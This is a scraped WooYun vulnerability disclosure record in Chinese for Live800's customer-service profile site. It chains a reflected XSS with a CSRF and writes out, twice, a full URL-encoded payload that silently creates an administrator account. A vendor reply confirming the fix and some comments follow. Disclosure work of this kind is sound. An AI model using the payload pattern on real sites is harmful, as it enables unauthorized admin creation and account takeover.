{"id": 50671, "wybug_id": "wooyun-2014-077182", "wybug_title": "Live800在线客服XSS+CSRF可直接添加管理员", "wybug_corp": "live800.com", "wybug_author": "0x_Jin", "wybug_date": "2014-09-25 09:56", "wybug_open_date": "2014-11-09 09:58", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "黑盒测试技巧", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-09：\t细节向公众公开  简要描述： M 锅在测试 XSS 的时候，我乱入了然后我也发现了点问题来提交了！ 详细说明：  先直接上 payload:\nhttp://profile.live800.com/profile/companyInfoViewCompanyAction.action?icon=%22%3Burlx%3D%22http%3A%2F%2Fprofile.live800.com%2Fprofile%2FaddOperatorManageAction.action%22%3BDatax%3D%22loginName%3Dadmin1%26name%3Djin%26nickName%3Djin%26ability%3D100%26attendAcd%3D1%26role%3DoperatorManager%26skills%3D%26phone1%3D%26email%3D%26passWord%3Dx123123%22%3Bxmlhttp1%3Dnew%20XMLHttpRequest%3Bxmlhttp1.open(%22POST%22%2Curlx%2C!0)%3Bxmlhttp1.setRequestHeader(%22Content-Type%22%2C%22application%2Fx-www-form-urlencoded%22)%3Bxmlhttp1.send(Datax)%3B%2F%2F\n1.首先发现了个 CSRF 虽然没做 token 跟来源页的判断但是做了同域的判断，跟 sohu 微博一样如果不是同域的话就不会提交成功。2.由于CSRF 漏洞存在于profile.live800.com 那么便在 profile 域里的网页里刷新了几下抓了个包。便很快就找到了 反射型xss。open url --> http://profile.live800.com/profile/companyInfoViewCompanyAction.action?icon=%22;alert(1);//打开便会弹窗应该需要登录。(如果没登录的话 csrf 也没意义了)；由于输入点出现在 js 里，所以浏览器不会拦截！然后我们来看下 csrf ：存在于：http://profile.live800.com/profile/findOperatorManageAction.action?skillId&webClass=live800.web.class.internal_Coordination这个页面的添加用户这里。然后抓了一下包，构造了 js 语句：\nurlx=\"http://profile.live800.com/profile/addOperatorManageAction.action\";Datax=\"loginName=admin1&name=jin&nickName=jin&ability=100&attendAcd=1&role=operatorManager&skills=&phone1=&email=&passWord=x123123\";xmlhttp1=new XMLHttpRequest;xmlhttp1.open(\"POST\",urlx,!0);xmlhttp1.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");xmlhttp1.send(Datax);\n都放在一行了 可能看起来有点乱，就是 post 添加管理界面，然后带上一些必须的属性跟值！然后把这个代码 放到那个反射型 XSS 里面去：\nhttp://profile.live800.com/profile/companyInfoViewCompanyAction.action?icon=%22%3Burlx%3D%22http%3A%2F%2Fprofile.live800.com%2Fprofile%2FaddOperatorManageAction.action%22%3BDatax%3D%22loginName%3Dadmin1%26name%3Djin%26nickName%3Djin%26ability%3D100%26attendAcd%3D1%26role%3DoperatorManager%26skills%3D%26phone1%3D%26email%3D%26passWord%3Dx123123%22%3Bxmlhttp1%3Dnew%20XMLHttpRequest%3Bxmlhttp1.open(%22POST%22%2Curlx%2C!0)%3Bxmlhttp1.setRequestHeader(%22Content-Type%22%2C%22application%2Fx-www-form-urlencoded%22)%3Bxmlhttp1.send(Datax)%3B%2F%2F\n把这个代码放到浏览器里执行便会添加一个叫 jin 的管理员 ID是：admin1 密码是 x123123现在我们来执行一下看看，首先当前界面的管理员如下：\n\n可以看到只有一个 admin 的管理员，现在我们访问一下 xss:\n\n然后再来看看现在我们的管理员界面：\n\n可以看到添加成功了！   漏洞证明：  先直接上 payload:\nhttp://profile.live800.com/profile/companyInfoViewCompanyAction.action?icon=%22%3Burlx%3D%22http%3A%2F%2Fprofile.live800.com%2Fprofile%2FaddOperatorManageAction.action%22%3BDatax%3D%22loginName%3Dadmin1%26name%3Djin%26nickName%3Djin%26ability%3D100%26attendAcd%3D1%26role%3DoperatorManager%26skills%3D%26phone1%3D%26email%3D%26passWord%3Dx123123%22%3Bxmlhttp1%3Dnew%20XMLHttpRequest%3Bxmlhttp1.open(%22POST%22%2Curlx%2C!0)%3Bxmlhttp1.setRequestHeader(%22Content-Type%22%2C%22application%2Fx-www-form-urlencoded%22)%3Bxmlhttp1.send(Datax)%3B%2F%2F\n1.首先发现了个 CSRF 虽然没做 token 跟来源页的判断但是做了同域的判断，跟 sohu 微博一样如果不是同域的话就不会提交成功。2.由于CSRF 漏洞存在于profile.live800.com 那么便在 profile 域里的网页里刷新了几下抓了个包。便很快就找到了 反射型xss。open url --> http://profile.live800.com/profile/companyInfoViewCompanyAction.action?icon=%22;alert(1);//打开便会弹窗应该需要登录。(如果没登录的话 csrf 也没意义了)；由于输入点出现在 js 里，所以浏览器不会拦截！然后我们来看下 csrf ：存在于：http://profile.live800.com/profile/findOperatorManageAction.action?skillId&webClass=live800.web.class.internal_Coordination这个页面的添加用户这里。然后抓了一下包，构造了 js 语句：\nurlx=\"http://profile.live800.com/profile/addOperatorManageAction.action\";Datax=\"loginName=admin1&name=jin&nickName=jin&ability=100&attendAcd=1&role=operatorManager&skills=&phone1=&email=&passWord=x123123\";xmlhttp1=new XMLHttpRequest;xmlhttp1.open(\"POST\",urlx,!0);xmlhttp1.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");xmlhttp1.send(Datax);\n都放在一行了 可能看起来有点乱，就是 post 添加管理界面，然后带上一些必须的属性跟值！然后把这个代码 放到那个反射型 XSS 里面去：\nhttp://profile.live800.com/profile/companyInfoViewCompanyAction.action?icon=%22%3Burlx%3D%22http%3A%2F%2Fprofile.live800.com%2Fprofile%2FaddOperatorManageAction.action%22%3BDatax%3D%22loginName%3Dadmin1%26name%3Djin%26nickName%3Djin%26ability%3D100%26attendAcd%3D1%26role%3DoperatorManager%26skills%3D%26phone1%3D%26email%3D%26passWord%3Dx123123%22%3Bxmlhttp1%3Dnew%20XMLHttpRequest%3Bxmlhttp1.open(%22POST%22%2Curlx%2C!0)%3Bxmlhttp1.setRequestHeader(%22Content-Type%22%2C%22application%2Fx-www-form-urlencoded%22)%3Bxmlhttp1.send(Datax)%3B%2F%2F\n把这个代码放到浏览器里执行便会添加一个叫 jin 的管理员 ID是：admin1 密码是 x123123现在我们来执行一下看看，首先当前界面的管理员如下：\n\n可以看到只有一个 admin 的管理员，现在我们访问一下 xss:\n\n然后再来看看现在我们的管理员界面：\n\n可以看到添加成功了！   修复方案：  反射型 XSS 处记得过滤危险字符，刚才有人给你们提交了一个存储型 XSS 了，如果再配上这个 就完美了！   版权声明：转载请注明来源 0x_Jin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-09-26 19:08 厂商回复： 非常感谢，确实有这个问题，已经修复了。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-25 12:29 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  你关注的白帽子 0x_Jin 发表了漏洞 Live800在线客服XSS+CSRF可直接添加管理员    \n     2014-09-25 12:39 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  @进击的zjx ................这是昨天 M 锅一起玩的时候 搞到的 M 锅的存储型如果没提交 加上这个 就是绝配。。。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}